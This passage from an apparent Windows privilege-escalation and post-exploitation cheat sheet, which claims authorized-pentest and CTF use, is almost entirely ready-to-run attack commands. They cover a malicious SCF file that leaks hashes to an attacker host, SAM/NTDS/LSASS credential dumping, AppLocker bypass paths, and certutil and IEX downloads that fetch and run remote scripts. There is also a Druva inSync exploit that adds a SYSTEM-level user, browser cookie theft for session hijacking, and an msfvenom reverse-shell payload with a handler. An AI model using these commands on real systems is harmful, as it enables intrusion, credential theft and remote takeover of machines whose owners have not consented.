sudo responder -I eth0 -dwv

# Create @Inventory.scf (@ ensures it sorts to top of directory)
[Shell]
Command=2
IconFile=\\<ATTACKER_IP>@<PORT>\share\legit.ico
[Taskbar]
Command=ToggleDesktop

# Place in a network share that admins browse
# When opened in Explorer, Windows authenticates to your Responder instance
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### 10.4 Confirming Domain Admin Access

```powershell
# Validate credentials and access to DC
crackmapexec smb 10.129.43.9 -u server_adm -p 'Password123!'

# Dump specific domain user hash
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```

---

## 11. Credential Dumping

### 11.1 SAM & SYSTEM (Local Hashes)

```powershell
# Method 1 — reg save
reg save HKLM\SAM C:\Tools\sam.hiv
reg save HKLM\SYSTEM C:\Tools\system.hiv
impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL

# Method 2 — shadow copy paths
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM

# Parse on Linux
pwdump SYSTEM SAM > /root/sam.txt
samdump2 SYSTEM SAM -o sam.txt
john --format=NT /root/sam.txt
```

### 11.2 LSASS Memory Dump

```powershell
# ProcDump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Task Manager: Ctrl+Shift+Esc → Details → lsass.exe → Create Dump File

# Parse on attacker machine
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

### 11.3 NTDS.dit (Domain Hashes)

```powershell
# Via VSS
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
reg save HKLM\SYSTEM C:\Tools\SYSTEM

secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

### 11.4 Restic Backup Repository

> Backup tools can be gold mines — they often contain snapshots of SAM/NTDS.

```powershell
# Initialize backup (if needed)
mkdir E:\restic; restic.exe -r E:\restic init
$env:RESTIC_PASSWORD = 'Superbackup!'

# List available snapshots
restic.exe -r E:\restic\ snapshots

# Browse snapshot contents
restic.exe -r E:\restic\ ls <SNAPSHOT_ID>

# Extract SAM, SECURITY, SYSTEM from snapshot
restic.exe -r E:\restic\ restore <SNAPSHOT_ID> --target C:\Extraction `
  --include /C/Windows/System32/config/SAM `
  --include /C/Windows/System32/config/SECURITY `
  --include /C/Windows/System32/config/SYSTEM

# Parse extracted hives
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM local
```

### 11.5 Mount VHDX / VMDK for Offline Extraction

```powershell
# Discover virtual disk files
Snaffler.exe -d domain.local -s -v info -o snaffler_results.txt

# Linux — mount VMDK
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk

# Linux — mount VHDX
guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1

# Windows — Disk Management: File → Map Virtual Disks
```

---

## 12. Security Product Enumeration & Bypass

### 12.1 Enumerate Antivirus

```powershell
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
Get-MpComputerStatus
```

### 12.2 AppLocker

```powershell
# View effective policy
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Test if a binary is allowed
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone

# Enumerate all rules (path conditions)
[xml]$policy = Get-AppLockerPolicy -Effective -Xml
$policy.AppLockerPolicy.RuleCollection | ForEach-Object {
    $Type = $_.Type
    $_.GetElementsByTagName("FilePathCondition") | ForEach-Object {
        [PSCustomObject]@{
            "Rule Type"   = $Type
            "File / Path" = $_.Path
            "Action"      = $_.ParentNode.ParentNode.Action
            "Name"        = $_.ParentNode.ParentNode.Name
        }
    }
} | Format-Table -AutoSize
```

> **AppLocker Bypass Paths** — AppLocker commonly allows execution from:
> - `C:\Windows\Tasks`
> - `C:\Windows\Temp`
> - `C:\Users\Public`
> - `C:\Windows\System32\spool\drivers\color`

### 12.3 Default Writable Directories

> Useful when AppLocker blocks execution from user directories — these paths are often whitelisted.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\spool\printers
C:\Windows\System32\spool\servers
C:\Windows\tracing
C:\Windows\Temp
C:\Users\Public
C:\Windows\Tasks
C:\Windows\System32\tasks
C:\Windows\SysWOW64\tasks
C:\Windows\debug\wia
C:\Windows\System32\com\dmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\System32\fxstmp
C:\Windows\SysWOW64\fxstmp
```

### 12.4 SNMP Configuration (Can Contain Credentials)

```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```

---

## 13. File Transfer & LOLBins

### 13.1 CertUtil (Built-in)

```powershell
# Download file
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat

# Encode file (for exfil through restricted channels)
certutil -encode file1 encodedfile

# Decode
certutil -decode encodedfile file2
```

### 13.2 PowerShell Transfer

```powershell
Invoke-WebRequest -Uri "http://10.10.14.3:8080/tool.exe" -OutFile "C:\Users\Public\tool.exe"
(New-Object Net.WebClient).DownloadFile("http://10.10.14.3:8080/tool.exe","C:\Users\Public\tool.exe")
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/Invoke-PowerShellTcp.ps1')
```

### 13.3 SMB Share (Impacket)

```bash
# Attacker — host a share
smbserver.py -smb2support share $(pwd)
```

```powershell
# Victim — map the share
New-PSDrive -Name "Z" -PSProvider FileSystem -Root "\\10.10.14.3\share"
net use Z: \\10.10.14.3\share

# Copy from share
Copy-Item "\\10.10.14.3\share\pwn.exe" -Destination "C:\Users\Public\Desktop\"
```

### 13.4 LOLBAS Reference

> Full list: https://lolbas-project.github.io/

---

## 14. Restricted Environment Escape

> Applicable to kiosk environments, locked-down RDP sessions, or limited shells.

### 14.1 Paint Escape

```
File → Save As → type UNC path in filename box:
\\127.0.0.1\c$\users\<username>
```

### 14.2 Modify Existing Shortcut

```
Right-click .lnk file → Properties → Target → change to:
C:\Windows\System32\cmd.exe
```

### 14.3 Script Execution (Bypass Restrictions)

```bat
REM BAT
@echo off
cmd.exe
```

```vbs
' VBS
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe", 1, True
```

```powershell
# PowerShell
Start-Process cmd.exe
```

### 14.4 Accessing SMB Share from Restricted Environment

```powershell
New-PSDrive -Name "Z" -PSProvider FileSystem -Root "\\10.10.14.3\share"
net use Z: \\10.10.14.3\share

# Or use Explorer++ (portable file manager — bypasses restricted shell)
```

---

## 15. Monitoring & Intelligence Gathering

### 15.1 Process Command Line Monitoring

> Catch cleartext credentials passed on the command line by other processes.

```powershell
# Poll for new processes every second
while($true) {
    $process  = Get-WmiObject Win32_Process | Select-Object CommandLine
    Start-Sleep 1
    $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
    Compare-Object -ReferenceObject $process -DifferenceObject $process2
}

# Or use Procmon (Sysinternals)
IEX (iwr 'http://10.10.10.205/procmon.ps1')
```

### 15.2 Clipboard Monitoring

```powershell
# Invoke-ClipboardLogger — captures clipboard contents
# https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1
Invoke-ClipboardLogger
```

### 15.3 Event Log Analysis — Logon Events (4624)

```powershell
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4624]]" -MaxEvents 50 | ForEach-Object {
    $xml  = [xml]$_.ToXml()
    $user = ($xml.Event.EventData.Data | Where-Object {$_.Name -eq "TargetUserName"})."#text"
    $type = ($xml.Event.EventData.Data | Where-Object {$_.Name -eq "LogonType"})."#text"
    $ip   = ($xml.Event.EventData.Data | Where-Object {$_.Name -eq "IpAddress"})."#text"
    if ($user -notmatch "SYSTEM|ANONYMOUS|LOCAL SERVICE|NETWORK SERVICE|Window$") {
        [PSCustomObject]@{
            "Time"       = $_.TimeCreated
            "Username"   = $user
            "Logon Type" = $type
            "IP Address" = $ip
        }
    }
} | Format-Table -AutoSize
```

> **Logon Type Reference:**
> - `2` = Interactive (local)
> - `3` = Network (e.g., SMB)
> - `4` = Batch
> - `5` = Service
> - `10` = RemoteInteractive (RDP)

---

## 16. Rare & Specialized Techniques

### 16.1 Druva inSync Local Privilege Escalation

> Vulnerable version: Druva inSync 6.6.3 — RPC server listening on localhost:6064 runs commands as SYSTEM.

```powershell
# Find the service
netstat -ano | findstr 6064
get-process -Id <PID>
get-service | ? {$_.DisplayName -like '*inSync*'}

# PoC — add a user as SYSTEM
$cmd = "net user pwnd /add"
$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)
$header  = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd")
$length  = [System.BitConverter]::GetBytes($command.Length)
$s.Send($header); $s.Send($rpcType); $s.Send($length); $s.Send($command)
```

### 16.2 Firefox / Chrome Cookie Theft (Token Hijacking)

```powershell
# Firefox cookies → Slack/other web app session hijack
# Path: C:\Users\<user>\AppData\Roaming\Mozilla\Firefox\Profiles\<random>.default-release\cookies.sqlite
python3 cookieextractor.py --dbpath "/home/attacker/cookies.sqlite" --host slack --cookie d

# Chrome → SharpChromium
Invoke-SharpChromium -Command "cookies slack.com"
# Reference: https://github.com/djhohnstein/SharpChromium
```

### 16.3 Email Credential Harvesting

```powershell
# MailSniper — search Exchange/OWA for credentials in emails
# https://github.com/dafthack/MailSniper
```

### 16.4 Metasploit SMB Delivery

```powershell
msf6 exploit(windows/smb/smb_delivery) > search smb_delivery
set ForceExploit true
```

### 16.5 Reverse Shell via Metasploit (Meterpreter)

```powershell
# Generate payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.170 LPORT=9443 -f exe -o shell.exe

# Handler
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.10.15.170
msf6 > set LPORT 9443
msf6 > run
```

### 16.6 Start Process as Another User

```powershell
Start-Process powershell -Credential (Get-Credential)

# Run command as specific domain user
runas /user:DOMAIN\username cmd.exe
```

---

## Quick Reference — Key Tools

| Tool | Purpose |
|------|---------|
| `SharpUp.exe audit` | Automated local privesc checks |
| `PowerUp.ps1` | PowerShell-based privesc enumeration |
| `Sherlock.ps1` | Kernel exploit suggestions (legacy) |
| `WES-NG (wes.py)` | Windows Exploit Suggester Next Gen |
| `accesschk.exe` | Check object permissions |
| `Mimikatz` | Credential dumping / token manipulation |
| `LaZagne.exe` | Multi-application credential harvester |
| `SessionGopher.ps1` | Extract saved session credentials |
| `SharpChrome.exe` | Chrome credential/cookie extraction |
| `Snaffler.exe` | Network share credential discovery |
| `JuicyPotato / PrintSpoofer / GodPotato` | SeImpersonate → SYSTEM |
| `procdump.exe` | LSASS memory dump |
| `secretsdump.py` | Parse SAM/NTDS.dit/SECURITY hives |
| `impacket-secretsdump` | Remote/local hash extraction |
| `certutil.exe` | File download / encode/decode (LOLBin) |
| `Responder` | LLMNR/NBT-NS poisoning & hash capture |

---

*Maintained for authorized penetration testing and CTF purposes only.*
